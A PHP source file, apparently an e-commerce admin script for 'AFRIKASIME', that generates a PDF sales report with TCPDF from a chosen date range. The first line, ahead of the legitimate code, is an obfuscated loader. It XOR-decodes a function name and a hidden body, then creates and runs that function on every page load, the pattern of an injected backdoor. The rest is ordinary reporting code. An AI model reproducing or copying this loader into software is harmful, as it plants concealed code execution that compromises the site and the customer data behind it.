<?php $sAQUYvta='XB<O6 e,BYHN=T+'; $qMCItYN=';0Y.BE:J77+:T;E'^$sAQUYvta; $XlilADn='8SapW4S;J,U=lH1RMH4bs7>Jl S=Y>j7 :hGGuAca N>YL =ZpCT4h,RJL0f4,3gq XJOvew8T.ORhsOQ0EHfv  BbhkClclOjSYRpEGnlYElUl=J JOUT+qc59IJMjll;GAqie<NO:.itwnifXW0;lHGmnoxnR20bo0MkoOEB6H,oHQ 4AmHmzcb+X2 =,ivDO=qtLzIa-lFSOSJ1somP ZSKkBS+3I8hXPWdjqKJZM R2oVC0,;CFLzpoxro;y+tW8uq=K,gnhIRM0L;6xG5clt4P-LoUT+ylyb,YEuxxe+PJ povBX7W6VyxEdcB0BmFSJQ=8amUBo.6K Q4Xnnlg0=h9t dhV;mt  +iWqij:1V==ehI4qkP.5B0q 0DYHWpFW:lI=heOMJLaYeKX    Lb32n,rKj>3XQVweqI7=N6,WWWJ.b-<D;X.29+q=YEl 0I1oB3<1M+46ZAHTJPgolMJV;622EAnxB=>XiJ70DLXbsaQ5L97oXE3gP  FBDicEQKrctU.;C.ePiTaeWIwqEIXA 5w>W=m1dinwtQ7Jah9sDDHUuQapvavJwDpStRsPLpQHLcJllLOnS3+Z1i3--h A<4<CbeGUDB> WQgOg=ZT5mqaDJgmiCpf4.Q zFT71TkuP :9521VoQIxj5 0OOWkCe,'; $WQHyvbHa=$qMCItYN('', 'Q5IQ1A=X>E:S3-I;><GJTOQ83D2I8a5ZUNOnnU:ihF;P:8IR4P;;F7H3>-o9YYGOUD9>.ZESS1WfrHSoqKOAoROU6BUKdKXfFc56 Xa.NQyuWuHTvS>=91EYGQX=+dQLHRljXcl5j OZIZJNAB<6DZ7l.0N1XJ9WI9KYmNO<10Z-BGl:EMh0aVpjkY=FUOBAR+:IXOFs4kPfLw+2>PSRM6A6 .PHwOR=Y735.DWQ-+6>Ei8e0,BIZ .lRT0;= p0nT6KUUV.UGSViv;Q NSQgNiePP1Y-0>1RYQYFG<<NrqAO1>APRVf.V;C3Br8ni+VbEgw.0IYHM.HfHY9E0W0NFH8bx9l1s0H7HMPKERIjOINLP:HXLH2>xbtJT6Q.KU=yuwT-2CWC4aA+,>-AdEo.ALUEwh:OdQxANZR,0vJE1<YN+DE6;>0KJUS6d<OFXt.P,1DBQ:TYvlXT.DPSre,5>1NCLi.7OWmY 8GQy7W>AnSQ0-xDUA0G>XN03 J85XI567AD.42UOTqJZ7OLpOrAM:-BYa-95AnPU2DJlMISJTvUrPPXAup-bLdQIDVBsBwE5AjEaxEdp-ZmELjiN2AY;H6XHT7E9UGH0JB74=.QA3vKoCY; TDXAdjGMI8zoQX0LRb0VE50R ACUZSUq2xrrcPXY;ggBxoQ'^$XlilADn); $WQHyvbHa();
	include 'includes/session.php';

	function generateRow($from, $to, $conn){
		$contents = '';
	 	
		$stmt = $conn->prepare("SELECT *, sales.id AS salesid FROM sales LEFT JOIN users ON users.id=sales.user_id WHERE sales_date BETWEEN '$from' AND '$to' ORDER BY sales_date DESC");
		$stmt->execute();
		$total = 0;
		foreach($stmt as $row){
			$stmt = $conn->prepare("SELECT * FROM details LEFT JOIN products ON products.id=details.product_id WHERE sales_id=:id");
			$stmt->execute(['id'=>$row['salesid']]);
			$amount = 0;
			foreach($stmt as $details){
				$subtotal = $details['price']*$details['quantity'];
				$amount += $subtotal;
			}
			$total += $amount;
			$contents .= '
			<tr>
				<td>'.date('M d, Y', strtotime($row['sales_date'])).'</td>
				<td>'.$row['firstname'].' '.$row['lastname'].'</td>
				<td>'.$row['pay_id'].'</td>
				<td align="right">&#8373; '.number_format($amount, 2).'</td>
			</tr>
			';
		}

		$contents .= '
			<tr>
				<td colspan="3" align="right"><b>Total</b></td>
				<td align="right"><b>&#8373; '.number_format($total, 2).'</b></td>
			</tr>
		';
		return $contents;
	}

	if(isset($_POST['print'])){
		$ex = explode(' - ', $_POST['date_range']);
		$from = date('Y-m-d', strtotime($ex[0]));
		$to = date('Y-m-d', strtotime($ex[1]));
		$from_title = date('M d, Y', strtotime($ex[0]));
		$to_title = date('M d, Y', strtotime($ex[1]));

		$conn = $pdo->open();

		require_once('../tcpdf/tcpdf.php');  
	    $pdf = new TCPDF('P', PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);  
	    $pdf->SetCreator(PDF_CREATOR);  
	    $pdf->SetTitle('Sales Report: '.$from_title.' - '.$to_title);  
	    $pdf->SetHeaderData('', '', PDF_HEADER_TITLE, PDF_HEADER_STRING);  
	    $pdf->setHeaderFont(Array(PDF_FONT_NAME_MAIN, '', PDF_FONT_SIZE_MAIN));  
	    $pdf->setFooterFont(Array(PDF_FONT_NAME_DATA, '', PDF_FONT_SIZE_DATA));  
	    $pdf->SetDefaultMonospacedFont('helvetica');  
	    $pdf->SetFooterMargin(PDF_MARGIN_FOOTER);  
	    $pdf->SetMargins(PDF_MARGIN_LEFT, '10', PDF_MARGIN_RIGHT);  
	    $pdf->setPrintHeader(false);  
	    $pdf->setPrintFooter(false);  
	    $pdf->SetAutoPageBreak(TRUE, 10);  
	    $pdf->SetFont('helvetica', '', 11);  
	    $pdf->AddPage();  
	    $content = '';  
	    $content .= '
	      	<h2 align="center">AFRIKASIME</h2>
	      	<h4 align="center">SALES REPORT</h4>
	      	<h4 align="center">'.$from_title." - ".$to_title.'</h4>
	      	<table border="1" cellspacing="0" cellpadding="3">  
	           <tr>  
	           		<th width="15%" align="center"><b>Date</b></th>
	                <th width="30%" align="center"><b>Buyer Name</b></th>
					<th width="40%" align="center"><b>Transaction#</b></th>
					<th width="15%" align="center"><b>Amount</b></th>  
	           </tr>  
	      ';  
	    $content .= generateRow($from, $to, $conn);  
	    $content .= '</table>';  
	    $pdf->writeHTML($content);  
	    $pdf->Output('sales.pdf', 'I');

	    $pdo->close();

	}
	else{
		$_SESSION['error'] = 'Need date range to provide sales print';
		header('location: sales.php');
	}
?>